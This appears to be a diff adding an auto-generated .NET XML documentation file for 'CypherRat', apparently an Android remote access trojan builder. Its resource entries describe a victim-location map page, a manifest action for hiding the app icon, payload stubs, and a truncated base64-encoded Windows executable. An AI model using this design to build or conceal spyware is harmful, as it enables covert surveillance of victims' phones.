@@ -1,0 +1,199 @@
+﻿<?xml version="1.0"?>
+<doc>
+<assembly>
+<name>
+CypherRat
+</name>
+</assembly>
+<members>
+<member name="T:AngelAndroid_v2.My.Resources.Resources">
+<summary>
+  Uma classe de recurso de tipo de alta segurança, para pesquisar cadeias de caracteres localizadas etc.
+</summary>
+</member>
+<member name="P:AngelAndroid_v2.My.Resources.Resources.ResourceManager">
+<summary>
+  Retorna a instância de ResourceManager armazenada em cache usada por essa classe.
+</summary>
+</member>
+<member name="P:AngelAndroid_v2.My.Resources.Resources.Culture">
+<summary>
+  Substitui a propriedade CurrentUICulture do thread atual para todas as
+  pesquisas de recursos que usam essa classe de recurso de tipo de alta segurança.
+</summary>
+</member>
+<member name="P:AngelAndroid_v2.My.Resources.Resources._3g">
+<summary>
+  Consulta um recurso localizado do tipo System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AngelAndroid_v2.My.Resources.Resources._on">
+<summary>
+  Consulta um recurso localizado do tipo System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AngelAndroid_v2.My.Resources.Resources.Abov_mid">
+<summary>
+  Consulta um recurso localizado do tipo System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AngelAndroid_v2.My.Resources.Resources.ARPolice">
+<summary>
+  Consulta uma cadeia de caracteres localizada semelhante a Fsociety.
+</summary>
+</member>
+<member name="P:AngelAndroid_v2.My.Resources.Resources.chrg">
+<summary>
+  Consulta um recurso localizado do tipo System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AngelAndroid_v2.My.Resources.Resources.DataP">
+<summary>
+  Consulta uma cadeia de caracteres localizada semelhante a C:\ProgramData\cconfig.
+</summary>
+</member>
+<member name="P:AngelAndroid_v2.My.Resources.Resources.disconnected">
+<summary>
+  Consulta um recurso localizado do tipo System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AngelAndroid_v2.My.Resources.Resources.full">
+<summary>
+  Consulta um recurso localizado do tipo System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AngelAndroid_v2.My.Resources.Resources.HIDECODE">
+<summary>
+  Consulta uma cadeia de caracteres localizada semelhante a &lt;action android:name=&quot;[HIDE_CODE]&quot;/&gt;.
+</summary>
+</member>
+<member name="P:AngelAndroid_v2.My.Resources.Resources.log">
+<summary>
+  Consulta um recurso localizado do tipo System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AngelAndroid_v2.My.Resources.Resources.LOGO">
+<summary>
+  Consulta um recurso localizado do tipo System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AngelAndroid_v2.My.Resources.Resources.LOGS">
+<summary>
+  Consulta uma cadeia de caracteres localizada semelhante a TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1v
+ZGUuDQ0KJAAAAAAAAABQRQAATAEDAGq8rcYAAAAAAAAAAOAAIgALAVAAABgaAAByAgAAAAAA6jca
+AAAgAAAAQBoAAABAAAAgAAAAAgAABAAAAAAAAAAGAAAAAAAAAADgHAAAAgAAAAAAAAIAYIUAABAA
+ABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAAJU3GgBPAAAAAEAaAIRvAgAAAAAAAAAAAAAAAAAA
+AAAAAMAcAAwAAADcNhoAOAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAAAAAA [o restante da cadeia de caracteres foi truncado]&quot;;.
+</summary>
+</member>
+<member name="P:AngelAndroid_v2.My.Resources.Resources.low">
+<summary>
+  Consulta um recurso localizado do tipo System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AngelAndroid_v2.My.Resources.Resources.map">
+<summary>
+  Consulta uma cadeia de caracteres localizada semelhante a &lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;meta charset=&apos;utf-8&apos; /&gt;
+&lt;title&gt;\\name_victim:\\&lt;/title&gt;
+&lt;meta name=&apos;viewport&apos; content=&apos;initial-scale=1,maximum-scale=1,user-scalable=no&apos; /&gt;
+&lt;script src=&apos;https://api.tiles.mapbox.com/mapbox-gl-js/v1.0.0/mapbox-gl.js&apos;&gt;&lt;/script&gt;
+&lt;link href=&apos;https://api.tiles.mapbox.com/mapbox-gl-js/v1.0.0/mapbox-gl.css&apos; rel=&apos;stylesheet&apos; /&gt;
+&lt;style&gt;
+body { margin:0; padding:0; }
+#map { position:absolute; top:0; bottom:0; width:100%; }
+&lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+ &lt;div id=&apos;map&apos;&gt;&lt;/div&gt;
+ &lt;s [o restante da cadeia de caracteres foi truncado]&quot;;.
+</summary>
+</member>
+<member name="P:AngelAndroid_v2.My.Resources.Resources.max">
+<summary>
+  Consulta um recurso localizado do tipo System.Drawing.Icon semelhante a (Ícone).
+</summary>
+</member>
+<member name="P:AngelAndroid_v2.My.Resources.Resources.min">
+<summary>
+  Consulta um recurso localizado do tipo System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AngelAndroid_v2.My.Resources.Resources.MYSTUB">
+<summary>
+  Consulta um recurso localizado do tipo System.Byte[].
+</summary>
+</member>
+<member name="P:AngelAndroid_v2.My.Resources.Resources.MYSTUBTEN">
+<summary>
+  Consulta um recurso localizado do tipo System.Byte[].
+</summary>
+</member>
+<member name="P:AngelAndroid_v2.My.Resources.Resources.notifi">
+<summary>
+  Consulta um recurso localizado do tipo System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AngelAndroid_v2.My.Resources.Resources.OFF">
+<summary>
+  Consulta um recurso localizado do tipo System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AngelAndroid_v2.My.Resources.Resources.OFF_LOCK">
+<summary>
+  Consulta um recurso localizado do tipo System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AngelAndroid_v2.My.Resources.Resources.ON_LOCK">
+<summary>
+  Consulta um recurso localizado do tipo System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AngelAndroid_v2.My.Resources.Resources.PikPng_com_phone_frame_png_962974">
+<summary>
+  Consulta um recurso localizado do tipo System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AngelAndroid_v2.My.Resources.Resources.Police">
+<summary>
+  Consulta uma cadeia de caracteres localizada semelhante a Use com moderação .
+</summary>
+</member>
+<member name="P:AngelAndroid_v2.My.Resources.Resources.SDK29">
+<summary>
+  Consulta uma cadeia de caracteres localizada semelhante a                 &lt;action android:name=&quot;android.intent.action.CHOOSER&quot;/&gt;
+                &lt;action android:name=&quot;android.intent.action.MAIN&quot;/&gt;
+                &lt;category android:name=&quot;android.intent.category.INFO&quot;/&gt;
+                &lt;action android:name=&quot;android.intent.action.VIEW&quot;/&gt;
+                &lt;category android:name=&quot;android.intent.category.DEFAULT&quot;/&gt;
+                &lt;category android:name=&quot;com.android.internal.category.PLATLOGO&quot;/&gt;
+                &lt;action android:name=&quot;android.intent.action.SEND&quot;/&gt;
+  [o restante da cadeia de caracteres foi truncado]&quot;;.
+</summary>
+</member>
+<member name="P:AngelAndroid_v2.My.Resources.Resources.target__1_">
+<summary>
+  Consulta um recurso localizado do tipo System.Drawing.Bitmap.
+</summary>
+</member>
+<member name="P:AngelAndroid_v2.My.Resources.Resources.TF">
+<summary>
+  Consulta uma cadeia de caracteres localizada semelhante a .
+</summary>
+</member>
+<member name="P:AngelAndroid_v2.My.Resources.Resources.wallpaper">
+<summary>
+  Consulta uma cadeia de caracteres localizada semelhante a /9j/4QN0RXhpZgAATU0AKgAAAAgABwESAAMAAAABAAEAAAEaAAUAAAABAAAAYgEbAAUAAAABAAAAagEoAAMAAAABAAIAAAExAAIAAAAcAAAAcgEyAAIAAAAUAAAAjodpAAQAAAABAAAApAAAANAADqZ4AAAnEAAOpngAACcQQWRvYmUgUGhvdG9zaG9wIENTNSBXaW5kb3dzADIwMTc6MTA6MTMgMDE6NDM6MDcAAAAAA6ABAAMAAAAB//8AAKACAAQAAAABAAAAMKADAAQAAAABAAAAMAAAAAAAAAAGAQMAAwAAAAEABgAAARoABQAAAAEAAAEeARsABQAAAAEAAAEmASgAAwAAAAEAAgAAAgEABAAAAAEAAAEuAgIABAAAAAEAAAI+AAAAAAAAAEgAAAABAAAASAAAAAH/2P/tAAxBZG9iZV9DTQAC/+4ADkFkb2JlAGSAAAAAAf/bAIQADAgICAkIDAkJDBELCgsRFQ8MDA8VGBMTFRMTGBEMDAwM [o restante da cadeia de caracteres foi truncado]&quot;;.
+</summary>
+</member>
+<member name="P:AngelAndroid_v2.My.Resources.Resources.wifi">
+<summary>
+  Consulta um recurso localizado do tipo System.Drawing.Bitmap.
+</summary>
+</member>
+</members>
+</doc>
